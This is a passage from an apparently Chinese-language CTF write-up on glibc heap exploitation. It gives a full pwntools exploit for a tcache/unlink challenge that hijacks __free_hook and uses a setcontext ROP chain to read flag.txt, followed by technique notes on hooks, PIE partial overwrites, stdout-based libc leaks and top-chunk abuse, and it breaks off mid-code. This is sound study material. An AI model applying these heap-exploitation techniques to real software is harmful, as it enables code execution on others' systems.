chunk</li><li>uaf修改一个chunk来触发unlink_tcache中的fake chunk</li><li>触发unlink</li><li>分配出tcahe_perthread_struct,在0x220写上free_hook</li><li>选择一个chunk布置好各类参数</li><li>free触发</li></ol><p>其中3的具体步骤是:</p><ol><li>free一个0x21的chunk</li><li>free一个0x31的chunk</li><li>free一个0x3a1的chunk</li><li>free两个0x3b1的chunk</li></ol><p>其中0下21和0x31的chunk要是同一个</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,name</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">26976</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./op&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x0000000000015BB)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *setcontext+53&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x480</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">info(<span class="string">&quot;heap : &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">length = <span class="number">0xe0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x3a1</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x3a8</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * length + p64(<span class="number">0x300</span>) + p64(<span class="number">0x570</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(heap + <span class="number">0x40</span>) + p64(heap + <span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x100</span> + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">cmd(<span class="built_in">str</span>(<span class="number">50056</span>))</span><br><span class="line"><span class="comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span></span><br><span class="line">p.send(p64(libc.address+<span class="number">0x000000000012be97</span>))<span class="comment">#just edit hook not chunk</span></span><br><span class="line"><span class="comment"># 0x7f903816ae35 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR [rdx+0xa0]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae3c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR [rdx+0x80]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae43 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR [rdx+0x78]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae47 &lt;setcontext+71&gt;:mov    r12,QWORD PTR [rdx+0x48]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4b &lt;setcontext+75&gt;:mov    r13,QWORD PTR [rdx+0x50]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4f &lt;setcontext+79&gt;:mov    r14,QWORD PTR [rdx+0x58]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae53 &lt;setcontext+83&gt;:mov    r15,QWORD PTR [rdx+0x60]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae57 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5e &lt;setcontext+94&gt;:push   rcx</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5f &lt;setcontext+95&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae63 &lt;setcontext+99&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae67 &lt;setcontext+103&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae6e &lt;setcontext+110&gt;:mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae72 &lt;setcontext+114&gt;:mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae76 &lt;setcontext+118&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7d &lt;setcontext+125&gt;:xor    eax,eax</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7f &lt;setcontext+127&gt;:ret    </span></span><br><span class="line"><span class="comment"># 00000000000026542: pop rdi; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000012bdc9: pop rdx; pop rsi; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment"># 0x00000000000cf6c5: syscall; ret;x</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000026542</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x0000000000047cf8</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc.address</span><br><span class="line">payload = p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span>)+p64(heap+<span class="number">0x1ac0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;flag.txt&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1ad0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1b78</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="0x1chunk地址"><a href="#0x1chunk地址" class="headerlink" title="0x1chunk地址"></a>0x1chunk地址</h2><p>程序(有缓冲)在运行中进行第一次io操作时<u><strong>(i操作申请一个,o操作申请一个)</strong></u>,都会申请两个chunk(应该是stdin和stdout的缓冲区)</p><p>不过还不确定跟环境有没有关系</p><p><strong>已知：</strong></p><ol><li>如果程序有setbuf(stdin/stdout/stderr,0)操作的话就只会申请一个chunk了,且是大小结尾为0x90那个(应该是stdout的缓冲区)，对单独程序可以先行调试看看——-<strong><u>与setbuf有关</u></strong></li><li>又发现有没有这两个chunk还跟<strong>动态库libc和动态链接器ld的版本有关系</strong>，原装环境存在iochunk,但在切换动态版本后却没有这两个chunk，切换动态库和链接器后再次调试确定———<strong><u>与动态版本有关</u></strong></li><li>还与程序唤起方式有关<strong>,gdb唤起</strong>与<strong>pwntools唤起</strong>亦有差异,二者可能一个有一个没有——-<strong><u>与唤起方式有关</u></strong></li></ol><p>在固定环境下,由于页对齐的原因,申请的chunk的地址低位一般都是固定的,可以用gdb观测,依此通过partial overwrite等我们能够达到许多目的</p><h2 id="0x2hook执行参数"><a href="#0x2hook执行参数" class="headerlink" title="0x2hook执行参数"></a>0x2hook执行参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//_libc_free</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_malloc</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_realloc</span></span><br></pre></td></tr></table></figure><p>可以看到,hook不为空时,执行hook指向函数时的参数是由其包装函数决定的</p><ol><li>free执行时,是以所要释放chunk的mem指针作为参数</li><li>malloc和realloc都是以申请chunk大小(用户申请,非实际大小)为参数</li></ol><p>对于2来说,hook基本只能是onegadget了</p><p>但对于1来说,若在chunk中填入一些字符(如/bin/sh),则<strong>除了onegadget外,也可以直接调用system等函数</strong>,这题就是这样</p><h2 id="0x3mmap所分配chunk"><a href="#0x3mmap所分配chunk" class="headerlink" title="0x3mmap所分配chunk"></a>0x3mmap所分配chunk</h2><p>当申请chunk大小大于或接近top_chunk时,会创建mmap段并在mmap段中分配</p><p>分配的chunk的实际地址就是该mmap段的开始地址</p><p>且mmap段与libc.so段之间的偏移是固定的</p><p>在不能泄露libc的情况下可以用其相对偏移得到libc地址</p><h2 id="0x4双hook配合"><a href="#0x4双hook配合" class="headerlink" title="0x4双hook配合"></a>0x4双hook配合</h2><p>大多数时候,malloc_hook和realloc_hook(二者地址相邻)的fastbinchunk伪造都能寻找到合适的fakechunk,但free_hook则更难找到</p><p>当one_gadget直接使用都不能满足条件时,则要先跳转到realloc进行栈帧调整(调整多少,可以通过跳转偏移来控制),之后调用realloc_hook执行onegadget</p><h2 id="0x5-fini-array"><a href="#0x5-fini-array" class="headerlink" title="0x5.fini_array"></a>0x5.fini_array</h2><p>程序正常退出时会由_dl_fini(_dl_fini+823左右)调用<code>.fini_array</code>地址处的函数，<strong>不过只能利用一次</strong>。只能利用一次是因为栈上的环境等肯定变化了，返回地址等自然也变化了</p><p>在没开pie的情况下利用还是很简单的</p><h2 id="0x6调试细节"><a href="#0x6调试细节" class="headerlink" title="0x6调试细节"></a>0x6调试细节</h2><p>一直以来都被这个调试搞得很烦,gdb常常不在exp中我所需要的地方开始,偶尔还不能加载符号表…</p><p>苦于找不到相关的资料,只能摸索,总算找到解决方案了</p><h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p><strong>程序由gdb运行和pwntools运行这两种方式,唤起的程序的环境有些许不同</strong></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>先说有时候无法加载符号表,导致无法正常调试</p><p>多次实验后发现起因是—exp一路打通了shell所导致</p><p><strong>解决方案:</strong>在p.interactive()函数前使用命令<strong>sleep(1)或pause()</strong>使得程序停下来</p><p>这样便能加载符号表了</p><h3 id="合适的调试起始位置"><a href="#合适的调试起始位置" class="headerlink" title="合适的调试起始位置"></a>合适的调试起始位置</h3><p>经常attach上去发现不是自己想要的位置,导致调试困难</p><p><strong>解决方案:</strong>在gdb.attach()下方使用命令<strong>sleep(1)或pause()</strong>使得程序停下来,然后再<strong>配合backtrace</strong>找到合适的断点,进入正确的流程便可,(有时会被read卡住,需要再发送点东西)</p><p>需要注意如果没找到合适的断点的话,可能会出现一些奇怪的错误</p><p><strong>注意:</strong>gdb后组合pause可能会致使发生一些原本不存在的牛马问题</p><h3 id="另一种调试方式"><a href="#另一种调试方式" class="headerlink" title="另一种调试方式"></a>另一种调试方式</h3><p>由于pwntools中gdb常用是attach附加到一个进程上,所以完全可以,在python终端中早早打开gdb,然后在命令行中输入交互指令并发送,然后在gdb中逐步向下运行到需要调试的地方,(有时会被read卡住,需要再发送点东西)</p><h2 id="0x7main-arena偏移的获取"><a href="#0x7main-arena偏移的获取" class="headerlink" title="0x7main_arena偏移的获取"></a>0x7main_arena偏移的获取</h2><p>因为不能直接搜索符号main_arena,所以只能间接获得</p><p><code>main_arena_offset = libc.symbols[&#39;__malloc_hook&#39;] + 0x10</code></p><p>即main_arena在__malloc_hook向后0x10处</p><h2 id="0x8calloc分配的chunk"><a href="#0x8calloc分配的chunk" class="headerlink" title="0x8calloc分配的chunk"></a>0x8calloc分配的chunk</h2><p><code>malloc</code>分配的内存块的内容是不确定的，它可能包含之前被使用的数据残留。而<code>calloc</code>函数分配的内存块在分配时会被初始化为零，也就是说，每个字节都被设置为\0。</p><p>若存在tcache,calloc分配chunk不通过TCACHE,但依然会触发剩余chunk进入tcache</p><h2 id="0x9-maloc-hook附近的fake-chunk"><a href="#0x9-maloc-hook附近的fake-chunk" class="headerlink" title="0x9 __maloc_hook附近的fake_chunk"></a>0x9 __maloc_hook附近的fake_chunk</h2><p>一般情况下找到的能够控制到__maloc_hook的fake_chunk的大小都是<strong>0x7f</strong>,在main_arena前附近</p><h2 id="0xa-PIE的一种应对方式"><a href="#0xa-PIE的一种应对方式" class="headerlink" title="0xa PIE的一种应对方式"></a>0xa PIE的一种应对方式</h2><p>当开启pie后,利用方式与不开启有明显差异,一种比较常见的应对方式是<strong>尾地址部分改写</strong></p><p><strong>利用后12位不变性以及页对齐带来的堆地址结尾可观测性</strong></p><p>通过只改写部分数据来达到错位访问所需内存的目的</p><p>在堆中因为要出现堆地址,所以一般要先释放两个大小相同chunk,以达到通过fd获取某个chunk的地址,之后再部分写</p><h2 id="0xb-unsortedbin-chunk处理"><a href="#0xb-unsortedbin-chunk处理" class="headerlink" title="0xb unsortedbin-chunk处理"></a>0xb unsortedbin-chunk处理</h2><p>unsortedbin 是FIFO,头插尾取,寻找chunk主要利用bk指针</p><p>进入unsortedbin的chunk如果<strong>相邻会<u>立即合并</u></strong></p><p>并修改其后一个非freechunk的prev_size字段</p><p>unsortedbin中切割chunk时,分配出的chunk是前半部分,依然存在unsorted中的remainer则是后半部分,其实其他chunk切割也是这样</p><h2 id="0xc-prev-size字段何时变化"><a href="#0xc-prev-size字段何时变化" class="headerlink" title="0xc prev_size字段何时变化"></a>0xc prev_size字段何时变化</h2><p>prev_size字段只在上一个chunk为free状态时起作用</p><p>prev_size字段主要被修改在两种情况:</p><ol><li>合并chunk</li><li>分割chunk</li></ol><p><strong>第一种情况:</strong></p><p>合并chunk时修改其下一个chunk的prev_size字段</p><p><strong>第二种情况:</strong></p><p>修改剩余部分的下一个chunk的prev_size,其实依然是分割前的下一个chunk的prev_size,其不会修改剩余部分chunk的prev_size字段,因为前半部分处于使用状态显然不会去修改他</p><h2 id="0xd-io-overflow相关"><a href="#0xd-io-overflow相关" class="headerlink" title="0xd io_overflow相关"></a>0xd io_overflow相关</h2><p> <code>puts</code>等函数，会最终调用到 <code>_IO_new_file_overflow</code></p><p>而该函数会最终使用 <code>_IO_do_write</code> 进行真正的输出。</p><p>在输出时，如果具有缓冲区，会输出 <code>_IO_write_base</code> 开始的缓冲区内容，直到 <code>_IO_write_ptr</code> （也就是将 <code>_IO_write_base</code> 一直到 <code>_IO_write_ptr</code> 部分的值当做缓冲区</p><p>在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中）</p><p>但是在 <code>setbuf</code> 后，理论上会不使用缓冲区。然而如果能够修改 <code>_IO_2_1_stdout_</code> 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 <code>_IO_write_base</code> 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。</p><p>_IO_2_1_stdout与main_arena相距较近,部分写获得该区域作为chunk</p><p>flag满足条件后(<strong>flag==0xfbad1800</strong>)</p><p>当 <code>_IO_write_base</code>与<code>_IO_write_ptr</code>不相等时调用puts等时立即输出从_IO_write_base开始的内容</p><h2 id="0xe-chunk合并检测"><a href="#0xe-chunk合并检测" class="headerlink" title="0xe chunk合并检测"></a>0xe chunk合并检测</h2><p>释放chunk检测合并时,先检测上一个是否空闲,再检测下一个是否是topchunk,如果不是则检测下一个chunk</p><p>而合并会用到unlink宏,unlink中其中一个检测是检测该chunk的size是否与其下一个chunk的prev_size相等,注意其只是检测相等,并且下一个chunk是通过该chunk+size偏移得到的,一般都是相等的(自己构造的另说)</p><p>这也就是说如果任意修改一个chunk的prev_size字段并触发合并,只要这个chunk-prev_size刚好是一个chunk的起始地址,那么unlink检测就会通过,它不会比较我们修改的prev_size是否等于找到的chunk的size,而是用找到的chunk和利用该chunk的size找到的chunk的prev_size作比较</p><h2 id="0xf-无free时topchunk的利用"><a href="#0xf-无free时topchunk的利用" class="headerlink" title="0xf 无free时topchunk的利用"></a>0xf 无free时topchunk的利用</h2><p>当程序没有free功能时,若能够修改topchunk的size,可以减小topchunk的大小,再申请一个比修改后大小更大的chunk使之加入unsortedbin,这样可以利用unsortedbin去泄露libc</p><p>在申请的堆块大小大于 top chunk的大小时会调用 sysmalloc 来分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    If have mmap, and the request size meets the mmap threshold, and</span><br><span class="line">    the system supports mmap, and there are few enough currently</span><br><span class="line">    allocated mmapped regions, try to directly map this request</span><br><span class="line">    rather than expanding top.</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line"> if (av == NULL</span><br><span class="line">     || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</span><br><span class="line">     &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">   &#123;</span><br><span class="line">     char *mm;           /* return value from mmap call*/</span><br><span class="line"></span><br><span class="line">   try_mmap:</span><br></pre></td></tr></table></figure><p>如果申请大小 &gt; (unsigned long) (mp_.mmap_threshold) 就会直接 mmap 出一块内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  /*</span><br><span class="line">     If not the first time through, we require old_size to be</span><br><span class="line">     at least MINSIZE and to have prev_inuse set.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br><span class="line">............</span><br><span class="line">          if (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</span><br><span class="line">              set_head (old_top, old_size | PREV_INUSE | 